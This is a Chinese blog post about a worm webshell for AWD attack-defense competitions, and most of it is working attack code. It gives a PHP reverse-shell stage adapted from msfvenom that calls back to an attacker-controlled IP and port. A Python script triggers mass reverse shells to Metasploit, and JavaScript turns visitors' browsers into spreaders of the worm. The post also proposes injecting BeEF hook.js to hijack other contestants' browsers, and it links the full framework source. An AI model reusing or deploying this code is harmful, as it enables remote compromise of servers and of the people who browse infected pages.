原创：3s_NWGeek合天智汇

原创投稿活动：[重金悬赏 |
合天原创投稿等你来](http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/Nw2VDyvCpPt_GG5YKTQuUQ)

## 适配msf、前端传播与awd中蠕虫webshell的反渗透思路  

历史文章：
蠕虫webshell代码功能详情：[《基于AWD比赛的蠕虫webshell(一)》](https://mp.weixin.qq.com/s/8jrb_q8oysSfC2CC6m13bw)
蠕虫webshell复活框架：[《基于AWD比赛的蠕虫webshell(二)》](https://mp.weixin.qq.com/s/R9TDu5QdUnPUtfV-_v0iCw)

## 0x00 适配meterpreter  

为了防止其他意外情况比如说有一些意外的情况，某些不支持命令执行函数，如禁用assert，system函数等等，使用msfvemon生成php的马，整合到蠕虫webshell当中，增加一个判断参数"_r"是否要反弹shell。

## 0x01 主要代码  

elseif(isset($_GET['_r'])){ if (($f = 'stream_socket_client') &&
is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if
(!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type
= 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s =
$f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if
(!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket
funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream':
$len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; }
if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = '';
while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b.= fread($s,
$len - strlen($b)); break; case 'socket': $b.= socket_read($s, $len -strlen($b)); break; } }

## 0x02 批量反弹shell  

每个被感染的页面都可以加_r参数进行访问即可反弹shell到msf

批量访问http://192.168.1.X/.Conf_check.php?_r后反弹shell到msf，meterpreter产生多个会话后，可以批量执行命令。

#!/usr/bin/python # -*- coding: UTF-8 -*- #writed by 3s_NwGeek import
requests,base64 from gevent import monkey from gevent.pool import Pool
monkey.patch_all() targets =
open("C:\Users\\\3s_NwGeek\Desktop\\\target.txt").read().splitlines() #批量目标
local_bind_ip='192.168.3.1' #上传提交地址 change_url = "http://TARGET-IP/.Conf_check.php?_r=%s"%(base64.b64encode(local_bind_ip)) def main(target):
try: changeurl = change_url.replace('TARGET-IP', target) #页面的url head =
{'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0)
Gecko/20100101 Firefox/62.0', 'Accept':
'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
'Connection': 'close', 'Upgrade-Insecure-Requests': '1', 'Cache-Control':
'max-age=0'} requests.get(changeurl, headers=head,timeout=0.1) except
Exception as e: print target,' : request was send' pass if __name__ ==
'__main__': # main() pool = Pool(len(targets)) #批量 pool.map(main, targets)

msfconsole命令: Msf5 exploit（multi/handler）>sessions -c whoami

![v2-a1e4152478d1f0b28a3a9deeaf419275_hd.p](https://pic3.zhimg.com/80/v2-a1e4152478d1f0b28a3a9deeaf419275_hd.png)

## 0x03 前端传播  

为了方便更快速掌控，增加了前端传播功能，也就是现场比赛选手浏览者只要打开一个被蠕虫webshell感染的页面会自动循环跳转带参数“_”原生ajax请求进行传播。
成功感染的php文件首先会带?_参数重新访问本页面。
带这个参数访问会返回所有php文件的url，返回格式会带着eviltag标签，方便js提取。最终会循环随机访问
在比赛举办方和其他队伍的流量监控中也不是只有一个人发起这种流量特征了，有一点点的混淆视听作用。

## 0x04 前端代码  

//循环 function sleep(delay) { var start = new Date().getTime(); while (new
Date().getTime() < start + delay); } function trans() { const rurl =
document.getElementsByTagName("eviltag")[Math.ceil(Math.random() *
document.getElementsByTagName("eviltag").length)].innerHTML + "?_"; const rq =
new XMLHttpRequest(); rq.open("get", rurl, false); rq.send(); } #判断是否带“_”参数 if
(window.location.href.indexOf("?_") == -1) {
location.replace(window.location.href + "?_") } else { while (true) { try {
trans() } catch(e) { console.log(e) }; sleep(3000) } }

为了方便，我把它压缩成一行：

function sleep(delay){var start=new Date().getTime();while(new
Date().getTime()<start+delay)}function trans(){const
rurl=document.getElementsByTagName("eviltag")[Math.ceil(Math.random()*document.getElementsByTagName("eviltag").length)].innerHTML+"?_";const
rq=new
XMLHttpRequest();rq.open("get",rurl,false);rq.send()}if(window.location.href.indexOf("?_")==-1){location.replace(window.location.href+"?_")}else{while(true){try{trans()}catch(e){console.log(e)};sleep(3000)}}

## 0x05 应用示范  

正常访问php页面http://192.168.1.128/login.php的时候，js控制前端跳转http://192.168.1.128/login.php?_自动加了参数?_访问，带了?_参数访问后，每5秒发起ajax请求其他php页面，做到只要别人访问靶机任何php页面，就可以让他人帮助你进行传播蠕虫webshell。

![视频封面](https://pic3.zhimg.com/v2-7179b2b6cac35d0f07f68da84bbbbe5e.jpg)

（需要视频私聊小编哦）

## 0x06 反渗透思路  

在蠕虫webshell代码中加入beef框架中的hook.js，结合蠕虫webshell感染本地所有php页面的属性，无论选手们查看哪个页面，只要访问靶机（比赛中肯定要访问一下靶机吧），就可以反攻在场的每位参赛选手。
由于比赛人员大多为安全测试人员，平时工作为了测试漏洞，使用一些旧版的火狐（为了使用旧版hackbar）或者ie，这就增大了我们反攻RCE成功的几率。
在比赛的时候，一旦靶机中了蠕虫webshell，比赛选手们浏览正常的网页的时候，就被我们hook住为所欲为了。
但由于加上前端传播的js代码，实测再加hook.js浏览器很容易卡或者崩溃，大家都是安全人员很容易被发现。
为了用户体验这部分内容没加上去。不过目前比赛中还没见到规则说不能反渗透或者参赛选手电脑。

## 0x07 蠕虫webshell框架源码  

项目地址 <https://github.com/3sNwgeek/awd_worm_phpwebshell_framework/>

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关

  

